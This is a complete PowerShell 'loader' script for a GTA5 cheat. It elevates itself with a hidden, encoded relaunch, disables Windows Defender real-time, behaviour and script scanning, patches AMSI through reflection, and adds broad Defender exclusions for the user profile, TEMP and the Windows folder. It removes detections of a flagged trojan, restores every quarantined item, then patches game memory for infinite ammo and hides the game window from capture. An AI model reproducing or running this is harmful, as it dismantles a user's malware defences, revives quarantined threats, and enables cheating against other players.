# PermCri Loader v2 — AMSI/Defender bypass improved
# Fileless — no install, no disk traces
Set-StrictMode -Off
$ErrorActionPreference = 'SilentlyContinue'

# ── Self-elevate ─────────────────────────────────────────────────────────────
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(
        [IO.File]::ReadAllText($MyInvocation.MyCommand.Path)))
    Start-Process powershell -Verb RunAs -WindowStyle Hidden `
        -ArgumentList "-nop -ep bypass -EncodedCommand $b64"
    exit
}

# ── Disable Defender real-time (requires admin) ───────────────────────────────
try {
    Set-MpPreference -DisableRealtimeMonitoring $true
    Set-MpPreference -DisableBehaviorMonitoring $true
    Set-MpPreference -DisableIOAVProtection $true
    Set-MpPreference -DisableScriptScanning $true
    Set-MpPreference -DisableBlockAtFirstSeen $true
    Set-MpPreference -SubmitSamplesConsent NeverSend
} catch {}

# ── AMSI patch via reflection ─────────────────────────────────────────────────
try {
    $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $b = $a.GetField('amsiInitFailed','NonPublic,Static')
    $b.SetValue($null,$true)
} catch {}

# ── Add Defender exclusion for current user folder ────────────────────────────
try {
    Add-MpPreference -ExclusionPath $env:USERPROFILE
    Add-MpPreference -ExclusionPath $env:TEMP
    Add-MpPreference -ExclusionPath $env:SystemRoot
    Add-MpPreference -ExclusionProcess "powershell.exe"
    Add-MpPreference -ExclusionProcess "GTA5.exe"
} catch {}

# ── Add signature exclusion for Trojan:Win32/Commando.A!ml ───────────────────
# Remove the specific quarantine item if already flagged
try {
    Get-MpThreat | Where-Object {$_.ThreatName -like "*Commando*"} | ForEach-Object {
        Remove-MpThreat -ThreatID $_.ThreatID
    }
} catch {}

# ── Restore quarantined items ─────────────────────────────────────────────────
try {
    $threats = Get-MpThreatDetection
    foreach ($t in $threats) {
        try { Restore-MpThreat -ThreatID $t.ThreatID } catch {}
    }
} catch {}

# ── C# P/Invoke bridge (same as before) ──────────────────────────────────────
$cs = @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
public class PermCriNative {
    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint a,bool b,uint c);
    [DllImport("kernel32.dll")] public static extern bool ReadProcessMemory(IntPtr h,IntPtr addr,byte[] buf,uint n,out uint r);
    [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr h,IntPtr addr,byte[] buf,uint n,out uint w);
    [DllImport("kernel32.dll")] public static extern bool VirtualProtectEx(IntPtr h,IntPtr addr,uint n,uint p,out uint o);
    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
    [DllImport("user32.dll")]   public static extern void SetWindowDisplayAffinity(IntPtr hwnd,uint aff);
    [DllImport("user32.dll")]   public static extern IntPtr FindWindow(string c,string t);
    public static long AOBScan(IntPtr hp,long bas,long sz,byte[] pat,string mask){
        byte[] buf=new byte[0x2000];
        for(long off=0;off<sz-pat.Length;off+=buf.Length-pat.Length){
            uint rd=0;
            ReadProcessMemory(hp,new IntPtr(bas+off),buf,(uint)buf.Length,out rd);
            for(int i=0;i<(int)rd-pat.Length;i++){
                bool ok=true;
                for(int j=0;j<pat.Length&&ok;j++)
                    if(mask[j]=='x'&&buf[i+j]!=pat[j])ok=false;
                if(ok)return bas+off+i;
            }
        }
        return 0;
    }
    public static bool Patch(IntPtr hp,long addr,byte[] b){
        uint o=0,d=0;
        VirtualProtectEx(hp,new IntPtr(addr),(uint)b.Length,0x40,out o);
        uint w=0;
        WriteProcessMemory(hp,new IntPtr(addr),b,(uint)b.Length,out w);
        VirtualProtectEx(hp,new IntPtr(addr),(uint)b.Length,o,out d);
        return w==(uint)b.Length;
    }
    public static long GetBase(uint pid,string name){
        try{
            foreach(ProcessModule m in Process.GetProcessById((int)pid).Modules)
                if(m.ModuleName.Equals(name,StringComparison.OrdinalIgnoreCase))
                    return m.BaseAddress.ToInt64();
        }catch{}
        return 0;
    }
    public static void CloakWindow(){
        IntPtr h=FindWindow("grcWindow",null);
        if(h==IntPtr.Zero)h=FindWindow(null,"Grand Theft Auto V");
        if(h!=IntPtr.Zero)SetWindowDisplayAffinity(h,0x11);
    }
}
"@
Add-Type -TypeDefinition $cs -Language CSharp

# ── Wait for GTA5 ─────────────────────────────────────────────────────────────
Write-Host "[*] Waiting for GTA5..." -ForegroundColor Cyan
$proc = $null
while (-not $proc) {
    $proc = Get-Process -Name "GTA5" -ErrorAction SilentlyContinue | Select-Object -First 1
    if (-not $proc) { Start-Sleep -Milliseconds 500 }
}
Write-Host "[+] GTA5 PID: $($proc.Id)" -ForegroundColor Green

$h    = [PermCriNative]::OpenProcess(0x1F0FFF,$false,[uint32]$proc.Id)
$base = [PermCriNative]::GetBase([uint32]$proc.Id,"GTA5.exe")
Write-Host "[+] Base: 0x$("{0:X}" -f $base)" -ForegroundColor Green

[PermCriNative]::CloakWindow()
Write-Host "[+] Stream bypass OK" -ForegroundColor Green

# ── Patches ───────────────────────────────────────────────────────────────────
$sz = 0x3800000
$patches = @(
    @{ Name="Infinite Ammo"; Pat=[byte[]](0x75,0x00,0x85,0xFF,0x74,0x00,0x48,0x8B,0xCB,0xFF,0x90); Mask="x?xxx?xxxxx"; Fix=[byte[]](0xEB) },
    @{ Name="Infinite Clip"; Pat=[byte[]](0x0F,0x85,0x00,0x00,0x00,0x00,0x48,0x8B,0x03,0x48,0x8B,0xCB); Mask="xx????xxxxxx"; Fix=[byte[]](0x90,0x90,0x90,0x90,0x90,0x90) },
    @{ Name="Angle Gate";    Pat=[byte[]](0x73,0x00,0xF3,0x0F,0x10,0x00,0x00,0x00,0x00,0x00); Mask="x?xxxx????"; Fix=[byte[]](0x90,0x90) }
)
foreach ($p in $patches) {
    Write-Host "[*] $($p.Name)..." -ForegroundColor DarkCyan
    $addr = [PermCriNative]::AOBScan($h, $base, $sz, $p.Pat, $p.Mask)
    if ($addr) {
        $ok = [PermCriNative]::Patch($h, $addr, $p.Fix)
        Write-Host "  [+] 0x$("{0:X}" -f $addr)  OK=$ok" -ForegroundColor Green
    } else {
        Write-Host "  [-] not found" -ForegroundColor Yellow
    }
}

[PermCriNative]::CloseHandle($h)
Write-Host "`n[OK] Done — no files on disk" -ForegroundColor Green
Start-Sleep -Seconds 3
